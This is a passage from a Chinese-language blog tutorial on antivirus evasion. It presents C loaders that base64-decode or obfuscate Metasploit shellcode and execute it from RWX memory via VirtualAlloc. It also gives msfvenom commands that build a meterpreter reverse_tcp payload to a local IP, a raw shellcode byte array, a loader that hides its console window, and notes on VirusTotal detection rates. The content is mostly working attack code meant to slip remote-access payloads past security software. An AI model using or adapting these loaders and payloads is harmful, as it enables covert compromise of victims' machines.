class="line">    return ((len + 2) / 3 * 4) + 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Base64encode(char *encoded, const char *string, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    char *p;</span><br><span class="line"></span><br><span class="line">    p = encoded;</span><br><span class="line">    for (i = 0; i &lt; len - 2; i += 3) &#123;</span><br><span class="line">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">        *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span><br><span class="line">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span><br><span class="line">        *p++ = basis_64[string[i + 2] &amp; 0x3F];</span><br><span class="line">    &#125;</span><br><span class="line">    if (i &lt; len) &#123;</span><br><span class="line">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        if (i == (len - 1)) &#123;</span><br><span class="line">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span><br><span class="line">            //    *p++ = &#x27;=&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">            *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span><br><span class="line">        &#125;</span><br><span class="line">        //*p++ = &#x27;=&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *p++ = &#x27;\0&#x27;;</span><br><span class="line">    return p - encoded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>base64.h</code>文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _BASE64_H_</span><br><span class="line">#define _BASE64_H_</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">    int Base64encode_len(int len);</span><br><span class="line">    int Base64encode(char * coded_dst, const char *plain_src, int len_plain_src);</span><br><span class="line"></span><br><span class="line">    int Base64decode_len(const char * coded_src);</span><br><span class="line">    int Base64decode(char * plain_dst, const char *coded_src);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#endif //_BASE64_H_</span><br></pre></td></tr></table></figure>

<p>使用gcc进行编译</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shellcode.c base64.c -o test.exe</span><br></pre></td></tr></table></figure>

<p>执行exe可正常上线</p>
<p><strong>方法二</strong></p>
<p>与方法一略有不同</p>
<p>base64.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">//  base64.c</span><br><span class="line">//  base64</span><br><span class="line">//</span><br><span class="line">//  Created by guofu on 2017/5/25.</span><br><span class="line">//  Copyright © 2017年 guofu. All rights reserved.</span><br><span class="line">//</span><br><span class="line">/**</span><br><span class="line">*  转解码过程</span><br><span class="line">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span><br><span class="line">*  先将要编码的转成对应的ASCII值</span><br><span class="line">*  如编码: s 1 3</span><br><span class="line">*  对应ASCII值为: 115 49 51</span><br><span class="line">*  对应二进制为: 01110011 00110001 00110011</span><br><span class="line">*  将其6个分组分4组: 011100 110011 000100 110011</span><br><span class="line">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span><br><span class="line">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span><br><span class="line">*  查找base64 转换表 对应 c z E z</span><br><span class="line">*</span><br><span class="line">*  解码</span><br><span class="line">*  c z E z</span><br><span class="line">*  对应ASCII值为 99 122 69 122</span><br><span class="line">*  对应表base64_suffix_map的值为 28 51 4 51</span><br><span class="line">*  对应二进制值为 00011100 00110011 00000100 00110011</span><br><span class="line">*  依次去除每组的前两位, 再拼接成3字节</span><br><span class="line">*  即: 01110011 00110001 00110011</span><br><span class="line">*  对应的就是s 1 3</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &quot;base64.h&quot;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// base64 转换表, 共64个</span><br><span class="line">static const char base64_alphabet[] = &#123;</span><br><span class="line">    &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;,</span><br><span class="line">    &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;,</span><br><span class="line">    &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;,</span><br><span class="line">    &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;,</span><br><span class="line">    &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;,</span><br><span class="line">    &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;,</span><br><span class="line">    &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;,</span><br><span class="line">    &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;,</span><br><span class="line">    &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;,</span><br><span class="line">    &#x27;+&#x27;, &#x27;/&#x27; &#125;;</span><br><span class="line"></span><br><span class="line">// 解码时使用</span><br><span class="line">static const unsigned char base64_suffix_map[256] = &#123;</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,</span><br><span class="line">    255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255,  62, 255, 255, 255,  63,</span><br><span class="line">    52,  53,  54,  55,  56,  57,  58,  59,  60,  61, 255, 255,</span><br><span class="line">    255, 254, 255, 255, 255,   0,   1,   2,   3,   4,   5,   6,</span><br><span class="line">    7,   8,   9,  10,  11,  12,  13,  14,  15,  16,  17,  18,</span><br><span class="line">    19,  20,  21,  22,  23,  24,  25, 255, 255, 255, 255, 255,</span><br><span class="line">    255,  26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,</span><br><span class="line">    37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,</span><br><span class="line">    49,  50,  51, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255 &#125;;</span><br><span class="line"></span><br><span class="line">static char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) &#123;</span><br><span class="line">    src &lt;&lt;= lnum; // src = src &lt;&lt; lnum;</span><br><span class="line">    src &gt;&gt;= rnum; // src = src &gt;&gt; rnum;</span><br><span class="line">    return src;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int base64_encode(const char *indata, int inlen, char *outdata, int *outlen) &#123;</span><br><span class="line"></span><br><span class="line">    int ret = 0; // return value</span><br><span class="line">    if (indata == NULL || inlen == 0) &#123;</span><br><span class="line">        return ret = -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int in_len = 0; // 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span><br><span class="line">    int pad_num = 0; // 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span><br><span class="line">    if (inlen % 3 != 0) &#123;</span><br><span class="line">        pad_num = 3 - inlen % 3;</span><br><span class="line">    &#125;</span><br><span class="line">    in_len = inlen + pad_num; // 拼接后的长度, 实际编码需要的长度(3的倍数)</span><br><span class="line"></span><br><span class="line">    int out_len = in_len * 8 / 6; // 编码后的长度</span><br><span class="line"></span><br><span class="line">    char *p = outdata; // 定义指针指向传出data的首地址</span><br><span class="line"></span><br><span class="line">                       //编码, 长度为调整后的长度, 3字节一组</span><br><span class="line">    for (int i = 0; i &lt; in_len; i += 3) &#123;</span><br><span class="line">        int value = *indata &gt;&gt; 2; // 将indata第一个字符向右移动2bit(丢弃2bit)</span><br><span class="line">        char c = base64_alphabet[value]; // 对应base64转换表的字符</span><br><span class="line">        *p = c; // 将对应字符(编码后字符)赋值给outdata第一字节</span><br><span class="line"></span><br><span class="line">                //处理最后一组(最后3字节)的数据</span><br><span class="line">        if (i == inlen + pad_num - 3 &amp;&amp; pad_num != 0) &#123;</span><br><span class="line">            if (pad_num == 1) &#123;</span><br><span class="line">                *(p + 1) = base64_alphabet[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))];</span><br><span class="line">                *(p + 2) = base64_alphabet[(int)cmove_bits(*(indata + 1), 4, 2)];</span><br><span class="line">                *(p + 3) = &#x27;=&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (pad_num == 2) &#123; // 编码后的数据要补两个 &#x27;=&#x27;</span><br><span class="line">                *(p + 1) = base64_alphabet[(int)cmove_bits(*indata, 6, 2)];</span><br><span class="line">                *(p + 2) = &#x27;=&#x27;;</span><br><span class="line">                *(p + 3) = &#x27;=&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123; // 处理正常的3字节的数据</span><br><span class="line">            *(p + 1) = base64_alphabet[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)];</span><br><span class="line">            *(p + 2) = base64_alphabet[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)];</span><br><span class="line">            *(p + 3) = base64_alphabet[*(indata + 2) &amp; 0x3f];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p += 4;</span><br><span class="line">        indata += 3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (outlen != NULL) &#123;</span><br><span class="line">        *outlen = out_len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int base64_decode(const char *indata, int inlen, char *outdata) &#123;</span><br><span class="line"></span><br><span class="line">    int ret = 0;</span><br><span class="line">    if (indata == NULL || inlen &lt;= 0 || outdata == NULL ) &#123;</span><br><span class="line">        return ret = -1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (inlen % 4 != 0) &#123; // 需要解码的数据不是4字节倍数</span><br><span class="line">        return ret = -2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int t = 0, x = 0, y = 0, i = 0;</span><br><span class="line">    unsigned char c = 0;</span><br><span class="line">    int g = 3;</span><br><span class="line"></span><br><span class="line">    while (indata[x] != 0) &#123;</span><br><span class="line">        // 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span><br><span class="line">        c = base64_suffix_map[indata[x++]];</span><br><span class="line">        if (c == 255) return -1;// 对应的值不在转码表中</span><br><span class="line">        if (c == 253) continue;// 对应的值是换行或者回车</span><br><span class="line">        if (c == 254) &#123; c = 0; g--; &#125;// 对应的值是&#x27;=&#x27;</span><br><span class="line">        t = (t &lt;&lt; 6) | c; // 将其依次放入一个int型中占3字节</span><br><span class="line">        if (++y == 4) &#123;</span><br><span class="line">            outdata[i++] = (unsigned char)((t &gt;&gt; 16) &amp; 0xff);</span><br><span class="line">            if (g &gt; 1) outdata[i++] = (unsigned char)((t &gt;&gt; 8) &amp; 0xff);</span><br><span class="line">            if (g &gt; 2) outdata[i++] = (unsigned char)(t &amp; 0xff);</span><br><span class="line">            y = t = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>base64.h</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifndef base64_h</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define base64_h</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> __cplusplus</span></span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"></span><br><span class="line">    int base64_encode(const char *indata, int inlen, char *outdata, int *outlen);</span><br><span class="line">    int base64_decode(const char *indata, int inlen, char *outdata);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif /* base64_h */</span></span><br></pre></td></tr></table></figure>

<p>shellcode.c</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;msf base64 code&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char str3[1000] = &#123; 0 &#125;;</span><br><span class="line">    //printf(&quot;%s &quot;, buf);</span><br><span class="line">    base64_decode(buf, (int)strlen(buf), str3);</span><br><span class="line"></span><br><span class="line">    //printf(&quot;%d  &quot;, sizeof(str3));</span><br><span class="line"></span><br><span class="line">    char *Memory;</span><br><span class="line"></span><br><span class="line">    Memory = VirtualAlloc(NULL, sizeof(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    memcpy(Memory, str3, sizeof(str3));</span><br><span class="line"></span><br><span class="line">    ((void(*)())Memory)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用msf生成base64编码的shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.3.30 lport=3333  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>

<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。</p>
<p>使用gcc进行编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shellcode.c base64.c -o test.exe</span><br></pre></td></tr></table></figure>

<p>执行exe即可上线</p>
<h4 id="8-python变形shellcode-汇编代码-未能复现成功"><a href="#8-python变形shellcode-汇编代码-未能复现成功" class="headerlink" title="8.python变形shellcode+汇编代码(未能复现成功)"></a>8.python变形shellcode+汇编代码(未能复现成功)</h4><p>msf生成shellcode（就用这种吧，其他的下面脚本会报错）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure>

<p>python2环境，需要安装capstone和keystone-engine包。使用脚本对shellcode进行变形<code>https://github.com/sayhi2urmom/shellcodeseperator/blob/master/main.py</code></p>
<p>将脚本中的<code>CODE = b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;     </code>替换为shell.c的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/webtools/BypassAntiVirus/encode_shellcode_python# python encode_shellcode.py</span><br><span class="line">unsigned char buf[]=&#123;0x90, 0xbb, 0x71, 0xe3, 0xaa, 0x34, 0x90, 0xdb, 0xcf, 0x90, 0xd9, 0x74, 0x24, 0xf4, 0x90, 0x58, 0x90, 0x29, 0xc9, 0x90, 0xb1, 0x59, 0x90, 0x83, 0xe8, 0xfc, 0x90, 0x31, 0x58, 0x10, 0x90, 0x3, 0x58, 0x10, 0x90, 0x93, 0x90, 0x66, 0x16, 0x90, 0x56, 0x90, 0xdc, 0xdc, 0x90, 0xd9, 0xa7, 0x1d, 0x82, 0x50, 0x42, 0x90, 0x2c, 0x90, 0x90, 0x66, 0x7, 0x90, 0x66, 0x6, 0x90, 0x1d, 0x24, 0x43, 0x4a, 0xae, 0x90, 0xcf, 0x90, 0x1, 0x7f, 0x25, 0x90, 0xbd, 0x8d, 0x4e, 0xc6, 0x4e, 0x90, 0x79, 0xe1, 0x90, 0x66, 0x1e, 0x90, 0x61, 0x90, 0x45, 0x90, 0x57&#125;;</span><br></pre></td></tr></table></figure>

<p>再在vs2019中编译以下文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">#define fucku __asm&#123;mov eax,eax&#125;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line"></span><br><span class="line">    typedef int(*pfunc)(void);</span><br><span class="line">    unsigned char buf[] = &#123;&#125;;</span><br><span class="line">    fucku;</span><br><span class="line">    BYTE* sc = (BYTE*)VirtualAlloc(NULL, sizeof(buf) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    fucku;</span><br><span class="line">    fucku;</span><br><span class="line">    //memcpy(sc,buf,sizeof(buf));</span><br><span class="line">    for (int i = 0; i&lt;sizeof(buf); i++) &#123;</span><br><span class="line">        fucku;</span><br><span class="line">        sc[i] = buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    pfunc shellcode = (pfunc)sc;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push shellcode</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">    //HANDLE lpThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)shellcode,NULL,0,NULL);</span><br><span class="line">    //WaitForSingleObject(lpThread,-1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="9-python-xor处理（VT-20-70-不能过360）"><a href="#9-python-xor处理（VT-20-70-不能过360）" class="headerlink" title="9.python+xor处理（VT:20&#x2F;70 不能过360）"></a>9.python+xor处理（VT:20&#x2F;70 不能过360）</h4><p>msf生成shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure>

<p>python生成xor代码</p>
